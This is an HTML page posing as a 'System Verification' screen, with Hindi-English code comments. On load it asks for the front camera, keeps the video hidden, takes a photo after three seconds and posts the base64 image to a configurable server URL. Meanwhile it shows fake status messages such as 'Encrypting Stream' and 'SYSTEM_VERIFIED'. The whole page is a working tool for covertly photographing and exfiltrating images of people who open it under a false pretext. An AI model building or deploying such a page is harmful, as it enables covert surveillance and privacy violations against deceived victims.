<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Verification</title>
    <style>
        body { font-family: sans-serif; background: #050505; color: #00ff00; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
        .box { border: 1px solid #00ff00; padding: 2rem; border-radius: 10px; background: #111; box-shadow: 0 0 20px rgba(0,255,0,0.2); }
        video, canvas { display: none; } /* Background mein chalega */
    </style>
</head>
<body>

<div class="box">
    <h2>S Y S T E M _ C H E C K</h2>
    <p id="msg">Initializing Encrypted Protocol...</p>
    <div id="status">Waiting for camera...</div>
</div>

<video id="video" autoplay playsinline muted style="width:1px; height:1px; opacity:0;"></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const statusDiv = document.getElementById('status');

    // 🛑 APNE SERVER KA URL (Localhost ya IP)
    const SERVER_URL = 'http://127.0.0.1:5000/upload'; 

    async function startProcess() {
        try {
            // Front camera mangna
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } 
            });
            
            video.srcObject = stream;
            
            // Wait karein jab tak video start na ho jaye
            video.onloadedmetadata = () => {
                video.play();
                statusDiv.innerText = "Encrypting Stream... Stay Still";
                
                // 3 SECOND KA WAIT (Black photo fix karne ke liye sabse zaroori)
                setTimeout(() => {
                    captureAndSend(stream);
                }, 3000); 
            };
        } catch (err) {
            statusDiv.innerText = "❌ ERROR: Permission Denied";
            console.error(err);
        }
    }

    async function captureAndSend(stream) {
        // Canvas size set karna video ke hisab se
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        
        const context = canvas.getContext('2d');
        // Photo click karna
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        // Data ko Base64 mein convert karna
        const imageData = canvas.toDataURL('image/jpeg', 0.7);

        // Camera band kar dena
        stream.getTracks().forEach(t => t.stop());

        statusDiv.innerText = "Sending Data Packet...";

        try {
            const response = await fetch(SERVER_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: imageData })
            });

            const result = await response.json();
            if(result.status === 'success') {
                statusDiv.innerText = "✅ SYSTEM_VERIFIED";
            }
        } catch (e) {
            statusDiv.innerText = "❌ CONNECTION_LOST";
        }
    }

    window.onload = startProcess;
</script>
</body>
</html>
